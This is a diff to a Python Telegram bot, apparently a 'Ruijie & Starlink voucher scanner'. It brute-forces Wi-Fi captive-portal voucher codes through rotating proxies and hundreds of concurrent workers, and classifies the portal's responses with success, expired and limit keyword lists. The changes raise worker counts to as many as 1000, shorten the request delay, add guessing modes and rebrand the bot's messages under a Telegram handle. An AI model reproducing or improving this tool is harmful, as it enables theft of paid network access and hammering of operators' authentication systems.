@@ -8,12 +8,10 @@ import time
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters
 
-# Logging configuration
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 def load_proxies_from_file():
-    # Git clone ထဲတွင် ပါလာနိုင်သော Proxy ဖိုင်နာမည်မျိုးစုံကို ရှာဖွေရန်
     filenames = ["Proxy.txt", "proxy.txt", "proxies.txt", "proxy_list.txt", "list.txt"]
     proxies = []
     for filename in filenames:
@@ -22,22 +20,20 @@ def load_proxies_from_file():
                 with open(filename, "r", encoding="utf-8") as f:
                     proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                     if proxies:
-                        print(f"[ProxyManager] Successfully loaded {len(proxies)} proxies from {filename}")
+                        print(f"[ProxyManager] Loaded {len(proxies)} proxies from {filename}")
                         return proxies
             except Exception as e:
                 print(f"[ProxyManager] Error reading {filename}: {e}")
                 
-    # ဖိုင်မရှိပါက သို့မဟုတ် ရှာမတွေ့ပါက အရန်သုံးရန် Fallback Proxies များ
     fallback_proxies = [
         "103.152.112.15:8080",
         "182.253.150.2:3128",
         "202.137.7.12:80",
         "114.6.14.31:8080"
     ]
-    print("[ProxyManager] Warning: No proxy file matched. Using default fallback proxies.")
+    print("[ProxyManager] Warning: Using default fallback proxies.")
     return fallback_proxies
 
-# Global Variables for Scanner State
 scanning_states = {}
 user_modes = {}
 user_workers = {}
@@ -54,15 +50,13 @@ def show_startup_banner():
     print("=" * 65)
     print("  ⚡  RUIJIE & STARLINK EXTREME VOUCHER SCANNER  ⚡")
     print("=" * 65)
-    print("[*] Status: Fully Configured & Online")
-    print("=" * 65)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     if chat_id not in user_modes:
         user_modes[chat_id] = "num6"
     if chat_id not in user_workers:
-        user_workers[chat_id] = 200
+        user_workers[chat_id] = 500
     
     if chat_id not in user_proxies or not user_proxies[chat_id]:
         user_proxies[chat_id] = load_proxies_from_file()
@@ -71,23 +65,23 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         proxy_indices[chat_id] = 0
         
     total_proxies = len(user_proxies.get(chat_id, []))
-    current_proxy_display = f"{proxy_indices[chat_id] + 1}/{total_proxies}" if total_proxies > 0 else "0/0"
+    current_proxy_display = f"{total_proxies}/{total_proxies}" if total_proxies > 0 else "0/0"
     
     keyboard = [
         [InlineKeyboardButton("🌐 Update Portal Link", callback_data="update_portal")],
         [InlineKeyboardButton("⚙️ Mode", callback_data="change_mode")],
         [InlineKeyboardButton(f"🔧 Workers: {user_workers[chat_id]}", callback_data="change_workers")],
         [InlineKeyboardButton(f"🔀 Proxies: {current_proxy_display}", callback_data="add_proxies")],
-        [InlineKeyboardButton("🚀 Start Scanner", callback_data="start_scanner")]
+        [InlineKeyboardButton("🚀 Start Scanner By Kage", callback_data="start_scanner")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     text = (
-        "⚡ Starlink & Ruijie Scanner Control Panel ⚡\n\n"
-        f"⚙ Mode: {user_modes[chat_id]}\n"
+        "⚡ Starlink Scanner Control Panel ⚡\n\n"
+        f"⚙ Current Mode: {user_modes[chat_id]}\n"
         f"🔧 Workers: {user_workers[chat_id]}\n"
-        f"📁 Proxies Loaded: {total_proxies} items\n"
-        f"🔀 Active Proxy: {current_proxy_display}"
+        f"📁 Proxy File: Proxy.txt\n"
+        f"🔀 Proxies: {current_proxy_display}"
     )
     
     if update.message:
@@ -106,14 +100,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "update_portal":
         await query.answer()
         context.user_data['waiting_for'] = 'portal'
-        await query.message.reply_text("🔗 Ruijie/Starlink Portal URL (wifidog link) ကို ပို့ပေးပါ:")
+        await query.message.reply_text("🔗 Portal URL ကို ပို့ပေးပါ:")
     
     elif data == "change_mode":
         await query.answer()
         keyboard = [
-            [InlineKeyboardButton("num6", callback_data="mode_num6"), InlineKeyboardButton("num7", callback_data="mode_num7"), InlineKeyboardButton("num8", callback_data="mode_num8")],
-            [InlineKeyboardButton("num9", callback_data="mode_num9")],
-            [InlineKeyboardButton("abc6", callback_data="mode_abc6"), InlineKeyboardButton("mix6", callback_data="mode_mix6")],
+            [InlineKeyboardButton("Num 6", callback_data="mode_num6"), InlineKeyboardButton("Num 7 Kage", callback_data="mode_num7"), InlineKeyboardButton("Num 8 Kage", callback_data="mode_num8")],
+            [InlineKeyboardButton("Num 9", callback_data="mode_num9"), InlineKeyboardButton("Abc 6", callback_data="mode_abc6")],
+            [InlineKeyboardButton("Mix6 Formula", callback_data="mode_mix6"), InlineKeyboardButton("Mix7 Random", callback_data="mode_mix7")],
             [InlineKeyboardButton("🔙 Back", callback_data="mode_back")]
         ]
         await query.message.edit_text("⚙ Choose Scanner Mode", reply_markup=InlineKeyboardMarkup(keyboard))
@@ -130,8 +124,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "change_workers":
         await query.answer()
         keyboard = [
-            [InlineKeyboardButton("100", callback_data="worker_100"), InlineKeyboardButton("200", callback_data="worker_200")],
-            [InlineKeyboardButton("300", callback_data="worker_300"), InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
+            [InlineKeyboardButton("500", callback_data="worker_500"), InlineKeyboardButton("800", callback_data="worker_800")],
+            [InlineKeyboardButton("1000", callback_data="worker_1000"), InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
         ]
         await query.message.edit_text("⚙️ Choose Worker Count", reply_markup=InlineKeyboardMarkup(keyboard))
         
@@ -149,9 +143,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not all_proxies:
             all_proxies = load_proxies_from_file()
             user_proxies[chat_id] = all_proxies
-        if all_proxies:
-            proxy_indices[chat_id] = (proxy_indices[chat_id] + 1) % len(all_proxies)
-        await query.answer()
+        await query.answer("Proxies updated successfully!")
         await start(update, context)
     
     elif data == "start_scanner":
@@ -214,7 +206,7 @@ async def worker_task(worker_id, session, portal_url, chat_id):
                 html_content = await response.text()
                 lower_html = html_content.lower()
                 
-                success_keywords = ["success", "welcome", "connected", "auth_pass", "login successfully", "internet", "minutes", "hours", "remaining", "authenticated"]
+                success_keywords = ["success", "welcome", "connected", "auth_pass", "login successfully", "internet", "minutes", "hours", "remaining", "authenticated", "balance"]
                 expired_keywords = ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]
                 limit_keywords = ["limit", "already logged", "in use", "too many", "blocked", "restricted", "exceeded"]
                 
@@ -229,7 +221,7 @@ async def worker_task(worker_id, session, portal_url, chat_id):
                     limits_counters[chat_id] = limits_counters.get(chat_id, 0) + 1
         except Exception:
             pass
-        await asyncio.sleep(0.002)
+        await asyncio.sleep(0.001)
 
 async def run_scanner_with_workers(query, context, portal_url):
     chat_id = query.message.chat_id
@@ -240,11 +232,10 @@ async def run_scanner_with_workers(query, context, portal_url):
     limits_counters[chat_id] = 0
     
     start_time = time.time()
-    workers_count = user_workers.get(chat_id, 200)
-    mode = user_modes.get(chat_id, "num6")
+    workers_count = user_workers.get(chat_id, 500)
     
     stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop_scanner_btn")]])
-    status_message = await query.message.reply_text("⚡ Scanner Running...", reply_markup=stop_keyboard)
+    status_message = await query.message.reply_text("⚡ Scanner Running ...\nThank for using Telegram @Kage", reply_markup=stop_keyboard)
     
     connector = aiohttp.TCPConnector(limit=workers_count, limit_per_host=workers_count, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
@@ -259,16 +250,19 @@ async def run_scanner_with_workers(query, context, portal_url):
             speed = (tried / elapsed * 60) if elapsed > 0 else 0.0
             hits_list = found_codes.get(chat_id, [])
             
+            hits_str = "\n".join([f"🔥 {code} | 3hr | 0 hr 0 min" for code in hits_list[-5:]]) if hits_list else "None yet"
+            
             live_text = (
-                "⚡ Scanner Running ⚡\n\n"
+                "⚡ Scanner Running ⚡\n"
+                "Thank for using By Telegram @Kage\n\n"
                 f"🏹 Tried: {tried:,}\n"
-                f"🎯 Current: {current_codes_tracker.get(chat_id, '000000')}\n"
-                f"🔥 Hits: {len(hits_list)}\n"
-                f"❌ Expired: {expired}\n"
-                f"⚠️ Limits: {limits}\n"
+                f"🎯 Current Code: {current_codes_tracker.get(chat_id, '000000')}\n"
+                f"🔥 Hits: {len(hits_list)} BY @Kage ကုဒ်စစ်\n"
+                f"❌ Kage Expired: {expired}\n"
+                f"⚠️ Kage Limits: {limits}\n"
                 f"⚡ Speed: {speed:,.1f} c/m\n"
                 "___________________\n"
-                f"🔥 Hit Codes Found:\n{', '.join(hits_list[-5:]) if hits_list else 'None yet'}"
+                f"🔥 Hit Codes By Kage:\n{hits_str}"
             )
             try:
                 await status_message.edit_text(live_text, reply_markup=stop_keyboard)
@@ -278,7 +272,7 @@ async def run_scanner_with_workers(query, context, portal_url):
             t.cancel()
 
     final_hits = found_codes.get(chat_id, [])
-    final_text = f"🛑 စကင်န်ဖတ်ခြင်း ပြီးဆုံးပါပြီ။\n\n"
+    final_text = f"🛑 ပြီးဆုံးပါပြီ။\n\n"
     if final_hits:
         final_text += "🔥 Hit Codes Found:\n" + "\n".join(final_hits)
     else:
@@ -299,4 +293,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-    
+                
